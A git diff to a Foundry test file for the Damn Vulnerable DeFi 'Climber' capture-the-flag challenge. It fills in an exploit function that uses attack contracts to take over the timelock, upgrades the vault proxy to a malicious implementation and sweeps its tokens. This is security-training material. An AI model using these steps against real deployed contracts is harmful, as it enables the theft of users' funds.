@@ -2,9 +2,10 @@
 pragma solidity ^0.8.0;
 
 import {Test} from "forge-std/Test.sol";
-import "../../src/climber/ClimberVault.sol";
+import {ClimberVault, ClimberVaultAttack, ClimberVaultAttackUpgrade} from "../../src/climber/ClimberVault.sol";
 import "../../src/climber/ClimberTimelock.sol";
 import "../../src/climber/ClimberConstants.sol";
+import {CallerNotTimelock} from "../../src/climber/ClimberErrors.sol";
 import "../../src/DamnValuableToken.sol";
 
 import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
@@ -22,7 +23,7 @@ contract ClimberTest is Test {
 
     uint256 public constant VAULT_TOKEN_BALANCE = 10_000_000e18;
     uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 1e17;
-    uint256 public constant TIMELOCK_DELAY = 60 * 60;
+    uint64 public constant TIMELOCK_DELAY = 60 * 60; // 1 hour
 
     function setUp() public {
         deployer = makeAddr("deployer");
@@ -50,6 +51,9 @@ contract ClimberTest is Test {
 
         assertEq(timelock.delay(), TIMELOCK_DELAY);
 
+        vm.expectRevert(CallerNotTimelock.selector);
+        timelock.updateDelay(TIMELOCK_DELAY + 1);
+
         assertEq(timelock.hasRole(PROPOSER_ROLE, proposer), true);
         assertEq(timelock.hasRole(ADMIN_ROLE, deployer), true);
         assertEq(timelock.hasRole(ADMIN_ROLE, timelockAddress), true);
@@ -62,7 +66,13 @@ contract ClimberTest is Test {
 
     function exploit() public {
         vm.startPrank(player);
+        ClimberVaultAttack attack = new ClimberVaultAttack(payable(address(timelock)), address(vault));
+        attack.attack();
 
+        ClimberVaultAttackUpgrade upgradeImplementation = new ClimberVaultAttackUpgrade();
+        vault.upgradeTo(address(upgradeImplementation));
+        ClimberVaultAttackUpgrade vaultV2 = ClimberVaultAttackUpgrade(address(vault));
+        vaultV2.sweepFunds(address(token));
         vm.stopPrank();
     }
 
